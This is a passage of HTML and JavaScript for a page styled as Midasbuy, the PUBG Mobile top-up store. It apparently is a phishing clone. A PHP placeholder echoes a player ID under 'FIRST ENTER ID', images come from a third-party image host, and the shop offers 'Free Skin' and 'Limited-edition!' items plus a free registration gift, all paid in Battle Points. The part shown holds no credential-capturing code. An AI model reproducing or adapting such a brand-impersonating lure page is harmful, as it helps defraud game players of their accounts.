                        "transMapLanKey": "checkinweek"
                    },
                    "fbb619c35073eb49": {
                        "defaultChannel": "os_credit_card",
                        "hash": "cardmanage",
                        "isNotVipTask": true,
                        "isVipTask": true,
                        "joinTaskLink": "/usercenter",
                        "transMapLanKey": "bindCard"
                    }
                },
                "transMapLanKey": {
                    "0be7d83bb624df3e": "checkinday",
                    "4c1a92fbce48be46": "checkinweek",
                    "fbb619c35073eb49": "bindCard"
                }
            },
            "toastTimeout": 2000,
            "verifyPageCounter": 60
        };
    </script>
    <script type="text/javascript">
        var sdk_rules = [{
            rule: "^https:\\/\\/nearme\\.atlas\\.com\\/\\?.*",
            type: "url",
            url: "https://{env}.api.unipay.qq.com/h5/overseah5/views/oppo/result.html"
        }, {
            rule: "^gojek:.*",
            type: "scheme"
        }, {
            rule: "^intent:.*",
            type: "intent"
        }, {
            rule: "^weixin:.*",
            type: "scheme"
        }];
    </script>


    <style type="text/css">
        input::-ms-clear {
            display: none;
        }

        .footer ul {
            margin-right: 15px;
        }

        .clause-box-pop {
            display: none;
        }
    </style>
    <script>

    </script>
    <script>
        jQuery.fn.placeholder = function() {
            var i = document.createElement('input'),
                placeholdersupport = 'placeholder' in i;
            if (!placeholdersupport) {
                var inputs = jQuery(this);
                inputs.each(function() {
                    var input = jQuery(this),
                        text = input.attr('placeholder'),
                        pdl = 0,
                        height = input.outerHeight(),
                        width = input.outerWidth(),
                        placeholder = jQuery('<span class="phTips">' + text + '</span>');
                    try {
                        pdl = input.css('padding-left').match(/\d*/i)[0] * 1;
                    } catch (e) {
                        pdl = 5;
                    }
                    placeholder.css({
                        'margin-left': -(width - pdl),
                        'height': height,
                        'line-height': height + 'px',
                        'position': 'absolute',
                        'color': '#cecfc9',
                        'font-size': '12px'
                    });
                    placeholder.click(function() {
                        input.focus();
                    });
                    if (input.val() != '') {
                        placeholder.css({
                            display: 'none'
                        });
                    } else {
                        placeholder.css({
                            display: 'inline'
                        });
                    }
                    placeholder.insertAfter(input);
                    input.keydown(function(e) {
                        placeholder.css({
                            display: 'none'
                        });
                    });
                    input.keyup(function(e) {
                        if (jQuery(this).val() != '') {
                            placeholder.css({
                                display: 'none'
                            });
                        } else {
                            placeholder.css({
                                display: 'inline'
                            });
                        }
                    });
                });
            }
            return this;
        };
    </script>
    <script type="text/javascript">
        var loadJS = function(d, s, id, src, callback) {
            if (!src) {
                return;
            }
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = src;
            js.onload = function() {
                callback && callback.onload && callback.onload(id);
            };
            js.onerror = function() {
                callback && callback.onerror && callback.onerror(id);
            }
            fjs.parentNode.insertBefore(js, fjs);
        };
        // scrollFun 不能被去掉或注释，注释了会导致 交易记录在移动端展示不全       
        function scrollFun() {
            var wInnerH = $(window).height(); // 设备窗口的高度（不会变）
            var bScrollH = $(document).height(); // 滚动条总高度
            var footerH = $('.have-pay-sec .footer').outerHeight();
            var footerHeight = $('.footer').outerHeight();
            var headerHeight = $('.header-box').outerHeight();
            if (wInnerH === bScrollH) {
                $('.pay-sec').addClass('pay-sec-flex');
                $('.pay-sec').show();
                // if (typeof newui === 'undefined') {
                //     $('.pay-sec').css('bottom', footerH + 'px');
                // }
                $('.have-pay-sec .footer').show();
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                if (
                    wInnerH -
                    ($('.special-box').offset() ? $('.special-box').offset().top : 0) -
                    $('.special-box').outerHeight() >
                    footerHeight + 16
                ) {
                    $('.special-foot .footer').show();
                } else {
                    $('.wrap').removeClass('special-foot');
                }
            } else {
                $('.record-detailt-pop .detailt-box').css('max-height', (wInnerH - headerHeight - 74) + 'px');
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.wrap').removeClass('special-foot');
            }
        }
        $(function() {
            setTimeout(function() {
                scrollFun();
            }, 0);
            window.addEventListener('resize', function() {
                scrollFun();
            });
            window.loadImages && window.loadImages();

            //  loadJS(document, 'script', 'gtag-jssdk','https://www.googletagmanager.com/gtag/js?id=UA-21773189-2');

            // 恢复 ga 禁用记录
            var gaSetting = window.localStorage && window.localStorage.getItem(gaKey());
            var active = gaSetting !== null ? gaSetting === 'true' : window.defaultDisableGaCountryList.indexOf(__Report_INFO.countryCode) === -1;
            var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
            $('.record-detailt-pop #gaStatus').html(word);
            if (active) {
                $('.record-detailt-pop .block .block-title .switch-box').addClass('open');
            }
            toggleGa(active);
            $('.record-detailt-pop #cookieSwitchBtn').on('click', function() {
                $(this).parent().toggleClass('open');
                var active = $(this).parent().hasClass('open');
                var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
                $('.record-detailt-pop #gaStatus').html(word);
                window.localStorage && window.localStorage.setItem(gaKey(), active);
                toggleGa(active);
            });
        });

        function toggleGa(active) {
            window['ga-disable-UA-21773189-2'] = !active;
            if (!active) {
                var topDomain = location.host.split('.').slice(-2).join('.');
                document.cookie = '_ga=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gid=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gat_gtag_UA_21773189_2=;expires=-1;domain=' + topDomain + ';path=/';
            }
        }

        function gaKey() {
            var isLogin = typeof muid !== 'undefined';
            var key = 'GASETTING_' + (isLogin ? muid : 'unlogged');
            return key;
        }
    </script>
    <script type="text/javascript">
        ! function() {
            "use strict";
            var r = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            window.btoa || (window.btoa = function(t) {
                for (var o, e, n = String(t), a = 0, i = r, c = ""; n.charAt(0 | a) || (i = "=", a % 1); c += i.charAt(63 & o >> 8 - a % 1 * 8)) {
                    if ((e = n.charCodeAt(a += .75)) > 255) throw new Error("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
                    o = o << 8 | e
                }
                return c
            }), window.atob || (window.atob = function(t) {
                var o = String(t).replace(/[=]+$/, "");
                if (o.length % 4 == 1) throw new Error("'atob' failed: The string to be decoded is not correctly encoded.");
                for (var e, n, a = 0, i = 0, c = ""; n = o.charAt(i++); ~n && (e = a % 4 ? 64 * e + n : n, a++ % 4) ? c += String.fromCharCode(255 & e >> (-2 * a & 6)) : 0) n = r.indexOf(n);
                return c
            })
        }();
    </script>
    <script type="text/javascript" src="https://cdn.midasbuy.com/js/x-midas/kEc9hjFh5DQJbz_iPEWrfFxadMVk4PbLDS-5P8jE73pfdUuDwNGKNVZjdEztcHdofAVaHXo6zRGXgLwuvsK_afAEj6w_mKyiUmq-7AesIRU~.js?max_age=31536000"></script>



    <script>
        var WebsiteHosts = ["pay.gpubgm.com", "www.midasbuy.com", "pay.pubgm.zing.vn", "nap.codm.360mobi.vn", "sandbox.midasbuy.com", "pay.kingdomcraftgame.com", "127.0.0.1", "localhost"];
    </script>

    <script>
        var throttle = function(func, wait, options) {
            var context, args, result;
            var timeout = null;
            var previous = 0;
            if (!options) {
                options = {}
            }
            var later = function() {
                previous = options.leading === false ? 0 : +new Date();
                timeout = null;
                result = func.apply(context, args);
                if (!timeout) {
                    context = args = null
                }
            };
            return function() {
                var now = +new Date();
                if (!previous && options.leading === false) {
                    previous = now
                }
                var remaining = wait - (now - previous);
                context = this;
                args = arguments;
                if (remaining <= 0 || remaining > wait) {
                    if (timeout) {
                        clearTimeout(timeout);
                        timeout = null
                    }
                    previous = now;
                    result = func.apply(context, args);
                    if (!timeout) {
                        context = args = null
                    }
                } else {
                    if (!timeout && options.trailing !== false) {
                        timeout = setTimeout(later, remaining)
                    }
                }
                return result
            }
        };
    </script>
    <style>
        [v-cloak] {
            display: none !important;
        }
		@font-face {
			font-family:dinm;
			src:url(../font/DINMITTELSCHRIFTSTD.eot);
			src:url(../font/DINMITTELSCHRIFTSTD.eot?#iefix) format('embedded-opentype'),url(../font/DINMITTELSCHRIFTSTD.woff) format('woff'),url(../font/DINMITTELSCHRIFTSTD.ttf) format('truetype'),url(../font/DINMITTELSCHRIFTSTD.svg#webfont34M5alKg) format('svg');
    </style>
</head>

<body>
    <input type="hidden" id="xMidasToken" value="26ae84cd80aeadc56277558d55ca7154f383c0b6335fcbc4b869fa60d9da0bc4e152a4f1d60a4b9b8da4b22a774b340a">
    <input type="hidden" id="xMidasVersion" value="1.0.1">
    <div class="wrap game-wrap game_list game_list_new ">




        <div class="header">

            <div class="main g-clr">

                <div class="menu-more">
                    <div class="icon-box">
                        <div class="line1 line"></div>
                        <div class="line2 line"></div>
                        <div class="line3 line"></div>
                    </div>
                </div>

                <h1 class="logo"><a class="pc" style="cursor:default">midasbuy</a></h1>

                <div class="menu max1440">
                    <a class="active navIndexButton">Home</a>

                    <a>Help Center</a>
                </div>
                <div class="menu min1440">

                </div>

                <div class="log">


                    <div class="logined">

                        <p class="user-email">My Account</p>

                    </div>

                    <a href="javascript:void(0)" class="register-tips" cr="login_control_bubble">
                        <p>REGISTER TO GET <span>PUBGM FREE</span> ITEM</p>
                    </a>




                    <div class="luanch">
                        <div class="country">
                            <img class="country-icon" src="https://cdn.midasbuy.com/images/30ee99398.png" alt="flag" />
                        </div>
                    </div>




                </div>
                <div class="user-mess-box vip-mess-box">
                    <div class="san"></div>
                    <div class="head-box">
                        <img class="top-logo" src="https://www.midasbuy.com/oversea_web/static/images/pc-logo.png" alt="img">
                        <img class="close-btn" src="https://www.midasbuy.com/oversea_web/static/images/big-new-close-icon.png" alt="img">
                    </div>
                    <ul>

                        <!-- 未登录 -->
                        <li class="user-not-login">
                            <p class="label"></p>
                            <div class="btn-box">
                                <div class="log-in headerLoginButton">SIGN IN</div>
                                <div class="register headerLoginButton">CREATE ACCOUNT</div>

                                <p class="exclusive-regist">
                                    <a class="user-box-tips">
                                        Get PUBGM exclusive registeration gift for <span>FREE</span>
                                    </a>
                                </p>

                            </div>
                        </li>

                        <li class="link check-status vipLoginButton">
                            <div class="title">Midasbuy VIP</div>
                            <div class="novip-icon">Check your status after log in</div>
                        </li>

                        <li class="link">
                            <a class="headerLoginButton">
                                <p class="unlogin-account-settings">View Account</p>
                            </a>
                        </li>

                        <li class="link">
                            <a class="headerLoginButton">
                                <p class="unlogin-transaction-record">Transcation Record</p>
                            </a>
                        </li>



                    </ul>
                </div>
                <div class="menu-nav-box">
                    <div class="head-box">
                        <img class="close-btn" src="https://www.midasbuy.com/oversea_web/static/images/big-new-close-icon.png" alt="img">
                        <img class="top-logo" src="https://www.midasbuy.com/oversea_web/static/images/pc-logo.png" alt="img">
                    </div>
                    <ul>
                        <li class="acitve navIndexButton"><a>Home</a></li>

                        <li class=""><a>Help Center</a></li>
                    </ul>


                </div>
                <div class="bg"></div>
            </div>
            <div class="menu-nav-box-bg"></div>
        </div>
        <script src="https://cdn.midasbuy.com/oversea_web/static/js/header.8a21d45a.js"></script>
        <div id="app" v-cloak>



            <div class="banner-wrap">


                <div id="swiper" class="swiper-container" style="height: auto;overflow: visible;">
                    <div class="swiper-wrapper swiper-wrapper1" id="swiper-wrapper">


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/s23_1920x3004db448d4.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/1920_240e35d0cfb.png) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/1920x240f819d7a5.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/s23_1920x3004db448d4.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/1920_240e35d0cfb.png) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/1920x240f819d7a5.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/s23_1920x3004db448d4.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>


                        <div class="swiper-slide" style="background: url(https://cdn.midasbuy.com/images/1920x240f819d7a5.jpg) no-repeat center;background-size: cover;">
                            <a class="banner-link">
                                <div class="img-box">
                                    <img class="banner-pic" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACwAAAAxCAQAAAALxYPPAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBgsLGTJGwpbsAAAAAW9yTlQBz6J3mgAAACxJREFUWMPtzEENAAAIBCC1f2ft4HY/CEBvZUzoFYvFYrFYLBaLxWKxWCz+OkvmAWHcq1PMAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTExVDExOjI1OjUwKzAwOjAwDrJzIQAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0xMVQxMToyNTo1MCswMDowMH/vy50AAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAAAElFTkSuQmCC" data-src="https://i.ibb.co/0YHHb4V/1629036647827.png" alt="img" cr="banner" width="auto" />
                                </div>
                            </a>
                        </div>

                    </div>
                    <div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets"></div>
                </div>
                <div class="mc"></div>
                <div class="mess x-main" style="pointer-events: none;">


                    <div class="left-btn" cr="banner_left" style="pointer-events: auto;"></div>
                    <div class="right-btn" cr="banner_right" style="pointer-events: auto;"></div>

                </div>


                <div class="nav-box">
                    <div class="main" data-tab="tab-list">
                        <ul>

                            <li class="list">
                                <a class="go-homepage-btn">PUBG Mobile</a>
                            </li>


                            <li class="list tab-count" :class="{ active: currentHightLight === 'currency'}">
                                <a class="go-currency-btn">Purchase</a>
                            </li>


                            <li class="list tab-count" :class="{ active: currentHightLight === 'items'}">
                                <a class="go-shop-btn">Shop</a>
                            </li>


                        </ul>
                    </div>
                </div>

            </div>

            <script type="application/javascript">
                function setNavPosition() {
                    $('.banner-wrap .nav-box li').each(function() {
                        if ($(this).hasClass('active')) {
                            var index = $('.banner-wrap .nav-box li').index(this);
                            var homeElementWidth = $('.banner-wrap .nav-box li').get(0).getBoundingClientRect().width;
                            var windowWidth = window.innerWidth;
                            var outerWidth = $(this).outerWidth(true);
                            // 中间值
                            var left = (windowWidth - outerWidth) / 2 - 20;
                            var offsetleft = $('.banner-wrap .nav-box li').get(index).offsetLeft;
                            var target = left - offsetleft;
                            if (target > 0) {
                                $('.banner-wrap .nav-box .main').get(0).scrollLeft = 0;
                                return;
                            }
                            $('.banner-wrap .nav-box .main').get(0).scrollLeft = 200;
                        }
                    })
                }
                $(function() {
                    setNavPosition();
                });
            </script>

            <div class="content">
                <div class="x-main">
				
				<div class="tab-nav-box sub-game-account">
                        <div class="section tab-nav-box sub-game-account sub-id">
                            <ul>
                                <li class="active"> Player ID Verification <em class="help-icon"></em></li>
                            </ul>
                            <div class="tab-box">
                                <div class="box id-box active">
                                    <div class="y-box">
									<div class="mess">
									<div class="id" style="">
									<span class="label">FIRST ENTER ID:</span>
									<p class="val"><?php echo $playid;?></p>
									</div>
									</div>
									<div class="link-mod-a">
									<a href="/">Edit</a>
									</div>
									</div>
                                </div>
                            </div>
                        </div>
                    </div>
					
                    <div class="pay-type-box payment g-clr">
                        <div class="title g-clr">
                            <p>Payment Method</p>
                        </div>
                        <div class="pay-list-box g-clr">
                            <ul>
							<span>
                                    <li cr="payment_select.os_credit_card" data-id="os_credit_card" class="list-box activeParent">
                                        <div class="list active"><img src="https://i.ibb.co/n6jDWny/newBP.png" alt="">
                                            <div class="bd">
                                                <p class="label">Battle Points</p>
                                            </div>
                                        </div>
                                    </li>
                                </span>
								</ul>
                        </div>
                    </div>
					
                    <div class="vip-tips-box" style="display: none;">
                        <p>You can upgrade to VIP by spending USD 40</p>
                    </div>

                    <!-- 消息栏 -->
                    <div style="margin-top: 26px;">

                    <div class="section game_list_section shop-list-mod have-vip-tips g-clr">
                        <div class="list-box">
    <ul class="product-list-wrap">
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div class="more-prop"></div>
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="1 Purchas...">1 Purchas...</div>
                </div>
                <div class="pic"><img alt="img" src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" data-original="https://i.ibb.co/SJ0Pgd6/1629034322623.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Royale Pass Pack (Season M2) </p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">5.000 BP
                    <!---->
                </p>
            </div>
            <div class="prop-block">
                <div class="close"></div>
                <div class="z-bg"></div>
                <div class="block">
                    <div class="gift-details"><img src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" alt="img">
                        <div class="desc">
                            <p class="label">Please collect it from in-game mail.</p>
                            <p class="price">9.99 USD
                                <!---->
                            </p>
                        </div>
                    </div>
                    <div class="item-box">
                        <div class="item"><img src="https://i.ibb.co/SJ0Pgd6/1629034322623.png alt="img">
                            <div class="mess">
                                <p class="name">70UC</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                        <div class="item"><img src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" alt="img">
                            <div class="mess">
                                <p class="name">Royale Pass Upgrade Card (Season Month 1)</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                    </div>
                    <div class="btn">Buy It for <span>9.99 USD</span></div>
                </div>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div class="more-prop"></div>
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="1 Purchas...">1 Purchas...</div>
                </div>
                <div class="pic"><img alt="img" src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" data-original="https://i.ibb.co/SJ0Pgd6/1629034322623.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Elite Pass Plus Pack (Season M 2) </p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">10.000 BP
                    <!---->
                </p>
            </div>
            <div class="prop-block">
                <div class="close"></div>
                <div class="z-bg"></div>
                <div class="block">
                    <div class="gift-details"><img src="https://i.ibb.co/4Tvb89L/1629034322623.png" alt="img">
                        <div class="desc">
                            <p class="label">Please collect it from in-game mail.</p>
                            <p class="price">24.99 USD
                                <!---->
                            </p>
                        </div>
                    </div>
                    <div class="item-box">
                        <div class="item"><img src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" alt="img">
                            <div class="mess">
                                <p class="name">Classic Crate Coupon</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                        <div class="item"><img src="https://i.ibb.co/SJ0Pgd6/1629034322623.png" alt="img">
                            <div class="mess">
                                <p class="name">Elite Pass Plus Upgrade Card (Season Month 2)</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                    </div>
                    <div class="btn">Buy It for <span>24.99 USD</span></div>
                </div>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/1.png" data-original="../img/rewards/1.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">13.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/2.png" data-original="../img/rewards/2.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_Elite_Pass_Plus_Package" class="price">17.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/3.png" data-original="../img/rewards/3.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                <p class="shop-name">Limited-edition!</p>
                <p data-pid="S19_RP_Upgrade_Card_Package" class="price">19.000 BP
                    <!---->
                </p>
            </div>
        </li>
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                <div class="type-labels">
                    <div limit="9" class="time" title="Free Skin">Free Skin</div>
                </div>
                <div class="pic"><img alt="img" src="../img/rewards/4.png" data-original="../img/rewards/4.png" class="game-list-pic lazy" style="display: block;"></div>
